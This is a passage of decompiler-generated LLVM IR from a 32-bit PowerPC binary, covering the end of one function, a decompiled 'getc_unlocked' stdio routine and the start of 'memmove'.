  %v0_10011d7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10011d7c = load i32, i32* @r8, align 4
  %v2_10011d7c = add i32 %v1_10011d7c, 8
  %v3_10011d7c = inttoptr i32 %v2_10011d7c to i32*
  store i32 %v0_10011d7c, i32* %v3_10011d7c, align 4
  br label %dec_label_pc_10011db8

dec_label_pc_10011d84:                            ; preds = %dec_label_pc_10011d5c
  %v1_10011d84 = add i32 %tmp, 16
  %v2_10011d84 = inttoptr i32 %v1_10011d84 to i32*
  %v3_10011d84 = load i32, i32* %v2_10011d84, align 4
  store i32 %v3_10011d84, i32* %r0.global-to-local, align 4
  %v1_10011d88 = icmp slt i32 %v3_10011d84, 48
  %v3_10011d88 = icmp eq i32 %v3_10011d84, 48
  store i1 %v1_10011d88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011d88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011d88, label %dec_label_pc_10011d90, label %dec_label_pc_10011dac

dec_label_pc_10011d90:                            ; preds = %dec_label_pc_10011d84
  %v3_10011d90 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10011d94, i32* @r30, align 4
  %v2_10011d98 = add i32 %v3_10011d90, %v2_10011d4c
  store i32 %v2_10011d98, i32* %r0.global-to-local, align 4
  store i32 %v2_10011d98, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10011db8

dec_label_pc_10011da4:                            ; preds = %dec_label_pc_10011dc0
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10011df4

dec_label_pc_10011dac:                            ; preds = %dec_label_pc_10011d84
  store i32 %v2_10011d28, i32* %r0.global-to-local, align 4
  store i32 %v0_10011d94, i32* @r30, align 4
  br label %dec_label_pc_10011db8

dec_label_pc_10011db8:                            ; preds = %dec_label_pc_10011d30, %dec_label_pc_10011d90, %dec_label_pc_10011d68, %dec_label_pc_10011dac
  store i32 0, i32* @r29, align 4
  %v2_10011dbc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10011dbc, i32* @r31, align 4
  br label %dec_label_pc_10011dc0

dec_label_pc_10011dc0:                            ; preds = %dec_label_pc_10011df0, %dec_label_pc_10011db8
  %v0_10011dd0 = phi i32 [ %v1_10011ddc, %dec_label_pc_10011df0 ], [ %v2_10011dbc, %dec_label_pc_10011db8 ]
  %v1_10011dc0 = inttoptr i32 %v0_10011dd0 to i32*
  %v2_10011dc0 = load i32, i32* %v1_10011dc0, align 4
  store i32 %v2_10011dc0, i32* %r4.global-to-local, align 4
  %v0_10011dc4 = load i32, i32* @r27, align 4
  store i32 %v0_10011dc4, i32* %r3.global-to-local, align 4
  %v1_10011dc8 = add i32 %v0_10011dd0, 4
  %v2_10011dc8 = inttoptr i32 %v1_10011dc8 to i32*
  %v3_10011dc8 = load i32, i32* %v2_10011dc8, align 4
  store i32 %v3_10011dc8, i32* %r5.global-to-local, align 4
  %v0_10011dcc = load i32, i32* @r26, align 4
  store i32 %v0_10011dcc, i32* %ctr.global-to-local, align 4
  %v1_10011dd0 = add i32 %v0_10011dd0, 8
  %v2_10011dd0 = inttoptr i32 %v1_10011dd0 to i32*
  %v3_10011dd0 = load i32, i32* %v2_10011dd0, align 4
  store i32 %v3_10011dd0, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10011dcc)
  %v0_10011dd8 = load i32, i32* @r31, align 4
  %v1_10011dd8 = add i32 %v0_10011dd8, 4
  %v2_10011dd8 = inttoptr i32 %v1_10011dd8 to i32*
  %v3_10011dd8 = load i32, i32* %v2_10011dd8, align 4
  store i32 %v3_10011dd8, i32* %r0.global-to-local, align 4
  %v1_10011ddc = add i32 %v0_10011dd8, 12
  store i32 %v1_10011ddc, i32* @r31, align 4
  %v0_10011de0 = load i32, i32* @r29, align 4
  %v1_10011de0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10011de0 = add i32 %v1_10011de0, %v0_10011de0
  store i32 %v2_10011de0, i32* @r29, align 4
  %v2_10011de4 = icmp slt i32 %v1_10011de0, %v3_10011dd8
  %v4_10011de4 = icmp eq i32 %v1_10011de0, %v3_10011dd8
  store i1 %v2_10011de4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011de4, i1* %cr7_eq.global-to-local, align 1
  %v1_10011de8 = load i32, i32* @r30, align 4
  %v2_10011de8 = icmp ult i32 %v1_10011ddc, %v1_10011de8
  %v3_10011de8 = icmp ugt i32 %v1_10011ddc, %v1_10011de8
  %v4_10011de8 = icmp eq i32 %v1_10011ddc, %v1_10011de8
  store i1 %v2_10011de8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10011de8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10011de8, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10011de4, label %dec_label_pc_10011df0, label %dec_label_pc_10011da4

dec_label_pc_10011df0:                            ; preds = %dec_label_pc_10011dc0
  br i1 %v2_10011de8, label %dec_label_pc_10011dc0, label %dec_label_pc_10011df4

dec_label_pc_10011df4:                            ; preds = %dec_label_pc_10011df0, %dec_label_pc_10011da4
  %v0_10011df8 = phi i32 [ -1, %dec_label_pc_10011da4 ], [ %v2_10011de0, %dec_label_pc_10011df0 ]
  store i32 %v0_10011748, i32* %r0.global-to-local, align 4
  store i32 %v0_10011df8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011df8

; uselistorder directives
  uselistorder i32 %v0_10011df8, { 1, 0 }
  uselistorder i32 %v1_10011de0, { 2, 1, 0 }
  uselistorder i32 %v1_10011ddc, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10011dd8, { 1, 0, 2 }
  uselistorder i32 %v0_10011dd0, { 0, 2, 1 }
  uselistorder i32 %v3_10011d84, { 1, 0, 2 }
  uselistorder i32 %v1_10011d44, { 1, 0 }
  uselistorder i32 %v2_10011d28, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10011d20, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10011d1c, { 1, 0 }
  uselistorder i32 %v0_10011d94, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10011ce8, { 1, 2, 0 }
  uselistorder i32 %v1_10011ccc, { 1, 0, 2 }
  uselistorder i32 %v2_10011cc8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10011c98, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10011c68, { 2, 0, 1 }
  uselistorder i32 %v2_10011c64, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10011bd4, { 1, 0 }
  uselistorder i32 %v2_10011b38, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10011b0c, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10011ad4, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10011acc, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10011a98, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10011a88, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10011a7c, { 1, 0, 2 }
  uselistorder i32 %v1_10011a60, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10011a18, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10011a08, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100119ec, { 1, 0 }
  uselistorder i32 %v1_100119c8, { 1, 0 }
  uselistorder i32 %v2_100119a8, { 1, 0, 2 }
  uselistorder i32 %v0_10011950, { 1, 0 }
  uselistorder i32 %v1_100117b4, { 1, 0 }
  uselistorder i32 %v0_10011840, { 2, 1, 0 }
  uselistorder i32 %v1_10011788, { 1, 0 }
  uselistorder i32 %v1_10011768, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 4, 1, 3, 2, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 176, { 1, 2, 0, 3, 4 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10017ae0.672 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011db8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10011d18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011cc8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10011cb4, { 1, 0 }
  uselistorder label %dec_label_pc_10011c90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011c64, { 1, 0 }
  uselistorder label %dec_label_pc_10011c50, { 1, 0 }
  uselistorder label %dec_label_pc_10011c34, { 1, 0 }
  uselistorder label %dec_label_pc_10011c0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011bec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011bc8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10011bac, { 1, 0 }
  uselistorder label %dec_label_pc_10011b1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011ab8, { 1, 0 }
  uselistorder label %dec_label_pc_10011a78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011a3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011a10, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100119f0, { 1, 0 }
  uselistorder label %dec_label_pc_1001197c, { 1, 0 }
  uselistorder label %dec_label_pc_1001186c, { 1, 0 }
  uselistorder label %dec_label_pc_100117c4, { 1, 0 }
  uselistorder label %dec_label_pc_10011798, { 1, 0 }
  uselistorder label %dec_label_pc_1001178c, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10011e0c = load i32, i32* @lr, align 4
  store i32 %v0_10011e0c, i32* %r0.global-to-local, align 4
  %v0_10011e14 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10011e20 = add i32 %tmp, 16
  %v3_10011e20 = inttoptr i32 %v2_10011e20 to i32*
  %v4_10011e20 = load i32, i32* %v3_10011e20, align 4
  store i32 %v4_10011e20, i32* %r9.global-to-local, align 4
  %v2_10011e24 = add i32 %tmp, 24
  %v3_10011e24 = inttoptr i32 %v2_10011e24 to i32*
  %v4_10011e24 = load i32, i32* %v3_10011e24, align 4
  store i32 %v4_10011e24, i32* %r0.global-to-local, align 4
  %v2_10011e28 = icmp ult i32 %v4_10011e20, %v4_10011e24
  br i1 %v2_10011e28, label %dec_label_pc_10011e90, label %dec_label_pc_10011e30

dec_label_pc_10011e30:                            ; preds = %entry
  %v3_10011e30 = load i16, i16* %arg1, align 2
  %v4_10011e30 = zext i16 %v3_10011e30 to i32
  %v1_10011e34 = and i32 %v4_10011e30, 131
  store i32 %v1_10011e34, i32* %r0.global-to-local, align 4
  %v2_10011e38 = icmp ugt i32 %v1_10011e34, 128
  br i1 %v2_10011e38, label %dec_label_pc_10011e50, label %dec_label_pc_10011e40

dec_label_pc_10011e40:                            ; preds = %dec_label_pc_10011e30
  store i32 268508744, i32* @lr, align 4
  %v3_10011e44 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10011e20)
  store i32 %v3_10011e44, i32* %r3.global-to-local, align 4
  %v3_10011e48 = icmp eq i32 %v3_10011e44, 0
  br i1 %v3_10011e48, label %dec_label_pc_10011e40.dec_label_pc_10011e50_crit_edge, label %dec_label_pc_10011f2c

dec_label_pc_10011e40.dec_label_pc_10011e50_crit_edge: ; preds = %dec_label_pc_10011e40
  %v0_10011e50.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011e50

dec_label_pc_10011e50:                            ; preds = %dec_label_pc_10011e40.dec_label_pc_10011e50_crit_edge, %dec_label_pc_10011e30
  %v2_10011eb0 = phi i32 [ %v0_10011e50.pre, %dec_label_pc_10011e40.dec_label_pc_10011e50_crit_edge ], [ %tmp, %dec_label_pc_10011e30 ]
  %v1_10011e50 = inttoptr i32 %v2_10011eb0 to i16*
  %v2_10011e50 = load i16, i16* %v1_10011e50, align 2
  %v3_10011e50 = zext i16 %v2_10011e50 to i32
  %v1_10011e54 = and i32 %v3_10011e50, 2
  store i32 %v1_10011e54, i32* %r0.global-to-local, align 4
  %v3_10011e54 = icmp eq i32 %v1_10011e54, 0
  br i1 %v3_10011e54, label %dec_label_pc_10011e80, label %dec_label_pc_10011e5c

dec_label_pc_10011e5c:                            ; preds = %dec_label_pc_10011e50
  %v1_10011e5c = call i32 @__asm_rlwinm(i32 %v3_10011e50, i32 2, i32 29, i32 29)
  %v1_10011e60 = load i32, i32* @r31, align 4
  %v2_10011e60 = add i32 %v1_10011e60, %v1_10011e5c
  store i32 %v2_10011e60, i32* %r9.global-to-local, align 4
  %v1_10011e64 = add i32 %v2_10011e60, 39
  %v2_10011e64 = inttoptr i32 %v1_10011e64 to i8*
  %v3_10011e64 = load i8, i8* %v2_10011e64, align 1
  %v4_10011e64 = zext i8 %v3_10011e64 to i32
  store i32 %v4_10011e64, i32* %r0.global-to-local, align 4
  %v1_10011e68 = add nsw i32 %v3_10011e50, -1
  store i32 %v1_10011e68, i32* %r9.global-to-local, align 4
  %v1_10011e6c = trunc i32 %v1_10011e68 to i16
  %v3_10011e6c = inttoptr i32 %v1_10011e60 to i16*
  store i16 %v1_10011e6c, i16* %v3_10011e6c, align 2
  %v0_10011e70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10011e70, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10011e78 = load i32, i32* @r31, align 4
  %v2_10011e78 = add i32 %v1_10011e78, 40
  %v3_10011e78 = inttoptr i32 %v2_10011e78 to i32*
  store i32 0, i32* %v3_10011e78, align 4
  br label %dec_label_pc_10011f30

dec_label_pc_10011e80:                            ; preds = %dec_label_pc_10011e50
  %v1_10011e80 = add i32 %v2_10011eb0, 16
  %v2_10011e80 = inttoptr i32 %v1_10011e80 to i32*
  %v3_10011e80 = load i32, i32* %v2_10011e80, align 4
  store i32 %v3_10011e80, i32* %r9.global-to-local, align 4
  %v1_10011e84 = add i32 %v2_10011eb0, 20
  %v2_10011e84 = inttoptr i32 %v1_10011e84 to i32*
  %v3_10011e84 = load i32, i32* %v2_10011e84, align 4
  store i32 %v3_10011e84, i32* %r0.global-to-local, align 4
  %v4_10011e88 = icmp eq i32 %v3_10011e84, %v3_10011e80
  br i1 %v4_10011e88, label %dec_label_pc_10011e9c, label %dec_label_pc_10011e90

dec_label_pc_10011e90:                            ; preds = %dec_label_pc_10011e80, %entry
  %v1_10011f047 = phi i32 [ %v2_10011eb0, %dec_label_pc_10011e80 ], [ %tmp, %entry ]
  %v0_10011e90 = phi i32 [ %v3_10011e80, %dec_label_pc_10011e80 ], [ %v4_10011e20, %entry ]
  %v1_10011e90 = inttoptr i32 %v0_10011e90 to i8*
  %v2_10011e90 = load i8, i8* %v1_10011e90, align 1
  %v3_10011e90 = zext i8 %v2_10011e90 to i32
  store i32 %v3_10011e90, i32* %r3.global-to-local, align 4
  %v1_10011e94 = add i32 %v0_10011e90, 1
  store i32 %v1_10011e94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10011f04

dec_label_pc_10011e9c:                            ; preds = %dec_label_pc_10011e80
  %v1_10011e9c = add i32 %v2_10011eb0, 4
  %v2_10011e9c = inttoptr i32 %v1_10011e9c to i32*
  %v3_10011e9c = load i32, i32* %v2_10011e9c, align 4
  store i32 %v3_10011e9c, i32* %r0.global-to-local, align 4
  %v3_10011ea0 = icmp eq i32 %v3_10011e9c, -2
  br i1 %v3_10011ea0, label %dec_label_pc_10011ea8, label %dec_label_pc_10011eb8

dec_label_pc_10011ea8:                            ; preds = %dec_label_pc_10011e9c
  %v1_10011ea8 = or i32 %v3_10011e50, 4
  store i32 %v1_10011ea8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10011eb0 = trunc i32 %v1_10011ea8 to i16
  store i16 %v1_10011eb0, i16* %v1_10011e50, align 2
  br label %dec_label_pc_10011f30

dec_label_pc_10011eb8:                            ; preds = %dec_label_pc_10011e9c
  %v1_10011eb8 = and i32 %v3_10011e50, 768
  store i32 %v1_10011eb8, i32* %r0.global-to-local, align 4
  %v3_10011eb8 = icmp eq i32 %v1_10011eb8, 0
  br i1 %v3_10011eb8, label %dec_label_pc_10011ecc, label %dec_label_pc_10011ec0

dec_label_pc_10011ec0:                            ; preds = %dec_label_pc_10011eb8
  store i32 ptrtoint (i32** @global_var_10028598.592 to i32), i32* %r3.global-to-local, align 4
  store i32 268508876, i32* @lr, align 4
  %v4_10011ec8 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_10028598.592 to i16*), i32 %v3_10011e80)
  store i32 %v4_10011ec8, i32* %r3.global-to-local, align 4
  %v0_10011ecc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011ecc

dec_label_pc_10011ecc:                            ; preds = %dec_label_pc_10011eb8, %dec_label_pc_10011ec0
  %v0_10011f0c = phi i32 [ %v2_10011eb0, %dec_label_pc_10011eb8 ], [ %v0_10011ecc.pre, %dec_label_pc_10011ec0 ]
  %v1_10011ecc = add i32 %v0_10011f0c, 8
  %v2_10011ecc = inttoptr i32 %v1_10011ecc to i32*
  %v3_10011ecc = load i32, i32* %v2_10011ecc, align 4
  store i32 %v3_10011ecc, i32* %r9.global-to-local, align 4
  %v1_10011ed0 = add i32 %v0_10011f0c, 12
  %v2_10011ed0 = inttoptr i32 %v1_10011ed0 to i32*
  %v3_10011ed0 = load i32, i32* %v2_10011ed0, align 4
  store i32 %v3_10011ed0, i32* %r0.global-to-local, align 4
  %v4_10011ed4 = icmp eq i32 %v3_10011ed0, %v3_10011ecc
  br i1 %v4_10011ed4, label %dec_label_pc_10011f0c, label %dec_label_pc_10011edc

dec_label_pc_10011edc:                            ; preds = %dec_label_pc_10011ecc
  %v2_10011edc = add i32 %v0_10011f0c, 24
  %v3_10011edc = inttoptr i32 %v2_10011edc to i32*
  store i32 %v3_10011ecc, i32* %v3_10011edc, align 4
  %v0_10011ee0 = load i32, i32* @r31, align 4
  store i32 %v0_10011ee0, i32* %r3.global-to-local, align 4
  store i32 268508904, i32* @lr, align 4
  %v3_10011ee4 = call i32 @__stdio_rfill(i32 %v0_10011ee0, i32 %v3_10011ecc)
  store i32 %v3_10011ee4, i32* %r3.global-to-local, align 4
  %v3_10011ee8 = icmp eq i32 %v3_10011ee4, 0
  br i1 %v3_10011ee8, label %dec_label_pc_10011f2c, label %dec_label_pc_10011ef0

dec_label_pc_10011ef0:                            ; preds = %dec_label_pc_10011edc
  %v0_10011ef0 = load i32, i32* @r31, align 4
  %v1_10011ef0 = add i32 %v0_10011ef0, 20
  %v2_10011ef0 = inttoptr i32 %v1_10011ef0 to i32*
  %v3_10011ef0 = load i32, i32* %v2_10011ef0, align 4
  store i32 %v3_10011ef0, i32* %r0.global-to-local, align 4
  %v1_10011ef4 = add i32 %v0_10011ef0, 16
  %v2_10011ef4 = inttoptr i32 %v1_10011ef4 to i32*
  %v3_10011ef4 = load i32, i32* %v2_10011ef4, align 4
  store i32 %v3_10011ef4, i32* %r9.global-to-local, align 4
  %v2_10011ef8 = add i32 %v0_10011ef0, 24
  %v3_10011ef8 = inttoptr i32 %v2_10011ef8 to i32*
  store i32 %v3_10011ef0, i32* %v3_10011ef8, align 4
  %v0_10011efc = load i32, i32* %r9.global-to-local, align 4
  %v1_10011efc = add i32 %v0_10011efc, 1
  store i32 %v1_10011efc, i32* %r0.global-to-local, align 4
  %v1_10011f00 = inttoptr i32 %v0_10011efc to i8*
  %v2_10011f00 = load i8, i8* %v1_10011f00, align 1
  %v3_10011f00 = zext i8 %v2_10011f00 to i32
  store i32 %v3_10011f00, i32* %r3.global-to-local, align 4
  %v1_10011f04.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011f04

dec_label_pc_10011f04:                            ; preds = %dec_label_pc_10011e90, %dec_label_pc_10011ef0
  %v1_10011f04 = phi i32 [ %v1_10011f047, %dec_label_pc_10011e90 ], [ %v1_10011f04.pre, %dec_label_pc_10011ef0 ]
  %v0_10011f04 = phi i32 [ %v1_10011e94, %dec_label_pc_10011e90 ], [ %v1_10011efc, %dec_label_pc_10011ef0 ]
  %v2_10011f04 = add i32 %v1_10011f04, 16
  %v3_10011f04 = inttoptr i32 %v2_10011f04 to i32*
  store i32 %v0_10011f04, i32* %v3_10011f04, align 4
  br label %dec_label_pc_10011f30

dec_label_pc_10011f0c:                            ; preds = %dec_label_pc_10011ecc
  %v1_10011f0c = inttoptr i32 %v0_10011f0c to i16*
  store i32 %v0_10011f0c, i32* %r3.global-to-local, align 4
  %v2_10011f10 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268508956, i32* @lr, align 4
  %v5_10011f18 = call i32 @__stdio_READ(i16* %v1_10011f0c, i32 %v2_10011f10, i32 1)
  store i32 %v5_10011f18, i32* %r3.global-to-local, align 4
  %v3_10011f1c = icmp eq i32 %v5_10011f18, 0
  br i1 %v3_10011f1c, label %dec_label_pc_10011f2c, label %dec_label_pc_10011f24

dec_label_pc_10011f24:                            ; preds = %dec_label_pc_10011f0c
  %v3_10011f24 = load i8, i8* %stack_var_-24, align 1
  %v4_10011f24 = sext i8 %v3_10011f24 to i32
  store i32 %v4_10011f24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011f30

dec_label_pc_10011f2c:                            ; preds = %dec_label_pc_10011e40, %dec_label_pc_10011f0c, %dec_label_pc_10011edc
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011f30

dec_label_pc_10011f30:                            ; preds = %dec_label_pc_10011f24, %dec_label_pc_10011f04, %dec_label_pc_10011ea8, %dec_label_pc_10011e5c, %dec_label_pc_10011f2c
  store i32 %v0_10011e0c, i32* %r0.global-to-local, align 4
  store i32 %v0_10011e14, i32* @r31, align 4
  %v0_10011f40 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011f40

; uselistorder directives
  uselistorder i32 %v0_10011f0c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10011e90, { 1, 0 }
  uselistorder i32 %v3_10011e80, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10011e60, { 1, 0 }
  uselistorder i32 %v3_10011e50, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10011eb0, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_10028598.592 to i16*), { 1, 0 }
  uselistorder i16* @global_var_10028270.307, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10011f30, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10011f2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011f04, { 1, 0 }
  uselistorder label %dec_label_pc_10011ecc, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10011f44 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_10011f4c = load i32, i32* @r5, align 4
  store i32 %v0_10011f4c, i32* @r11, align 4
  br i1 %v2_10011f44, label %dec_label_pc_10011f58, label %dec_label_pc_10011f54

dec_label_pc_10011f54:                            ; preds = %entry
  %v0_10011f54 = call i32 @memcpy()
  store i32 %v0_10011f54, i32* @r3, align 4
  %v0_10011f58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10011f58

dec_label_pc_10011f58:                            ; preds = %entry, %dec_label_pc_10011f54
  %v0_10011f58 = phi i32 [ %v0_10011f4c, %entry ], [ %v0_10011f58.pre, %dec_label_pc_10011f54 ]
  %v1_10011f58 = call i32 @__asm_rlwinm.(i32 %v0_10011f58, i32 29, i32 3, i32 31)
  store i32 %v1_10011f58, i32* %r9.global-to-local, align 4
  %v4_10011f58 = icmp eq i32 %v1_10011f58, 0
  %v1_10011f5c = load i32, i32* @r5, align 4
  %v2_10011f5c = add i32 %v1_10011f5c, %arg2
  store i32 %v2_10011f5c, i32* %r4.global-to-local, align 4
  %v0_10011f60 = load i32, i32* @r3, align 4
  %v2_10011f60 = add i32 %v0_10011f60, %v1_10011f5c
  store i32 %v2_10011f60, i32* %r10.global-to-local, align 4
  br i1 %v4_10011f58, label %dec_label_pc_10011f88, label %dec_label_pc_10011f68

dec_label_pc_10011f68:                            ; preds = %dec_label_pc_10011f58
  %v1_10011f68 = urem i32 %v2_10011f60, 4
  %v3_10011f68 = icmp eq i32 %v1_10011f68, 0
  br i1 %v3_10011f68, label %dec_label_pc_10011f70, label %dec_label_pc_10011fbc

dec_label_pc_10011f70:                            ; preds = %dec_label_pc_10011fd4.dec_label_pc_10011f70_crit_edge, %dec_label_pc_10011f68
  %v1_10011f7c.pre = phi i32 [ %v1_10011f7c.pre.pre, %dec_label_pc_10011fd4.dec_label_pc_10011f70_crit_edge ], [ %v2_10011f60, %dec_label_pc_10011f68 ]
  %v0_10011f70 = phi i32 [ %v1_10011fd4, %dec_label_pc_10011fd4.dec_label_pc_10011f70_crit_edge ], [ %v1_10011f58, %dec_label_pc_10011f68 ]
  store i32 %v0_10011f70, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10011f74

dec_label_pc_10011f74:                            ; preds = %dec_label_pc_10011f74, %dec_label_pc_10011f70
  %v1_10011f7c = phi i32 [ %v2_10011f80, %dec_label_pc_10011f74 ], [ %v1_10011f7c.pre, %dec_label_pc_10011f70 ]
  %v0_10011f74 = load i32, i32* %r4.global-to-local, align 4
  %v1_10011f74 = add i32 %v0_10011f74, -4
  %v2_10011f74 = inttoptr i32 %v1_10011f74 to i32*
  %v3_10011f74 = load i32, i32* %v2_10011f74, align 4
  %v1_10011f78 = add i32 %v0_10011f74, -8
  %v2_10011f78 = inttoptr i32 %v1_10011f78 to i32*
  %v3_10011f78 = load i32, i32* %v2_10011f78, align 4
  store i32 %v3_10011f78, i32* %r9.global-to-local, align 4
  store i32 %v1_10011f78, i32* %r4.global-to-local, align 4
  %v2_10011f7c = add i32 %v1_10011f7c, -4
  %v3_10011f7c = inttoptr i32 %v2_10011f7c to i32*
  store i32 %v3_10011f74, i32* %v3_10011f7c, align 4
